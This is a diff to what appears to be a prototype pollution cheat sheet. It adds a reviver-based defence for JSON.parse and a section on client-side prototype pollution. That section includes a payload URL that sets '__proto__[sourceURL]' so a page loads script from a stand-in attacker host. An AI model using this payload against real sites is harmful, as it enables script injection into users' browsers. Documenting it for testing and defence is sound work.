@@ -242,6 +242,20 @@ if (!validate(userInput)) {
 }
 ```
 
+### [NEW] JSON.parse() Reviver Fix
+**How it works:** Using the `reviver` function to block dangerous keys during parsing.
+```javascript
+const userInput = JSON.parse(payload, (key, value) => {
+  if (key === '__proto__' || key === 'constructor') return;
+  return value;
+});
+```
+
+### [NEW] Client-Side Prototype Pollution (CSPP)
+**How it works:** Exploiting front-end libraries (like `query-string` or `merge-options`) that take URL parameters and merge them into a configuration object.
+**Payload:** `http://site.com/?__proto__[sourceURL]=http://attacker.com/evil.js`
+**Target:** Applications using gadgets like `jQuery.getScript` or dynamic script loading.
+
 ---
 
 ## 🔗 Chain Exploits
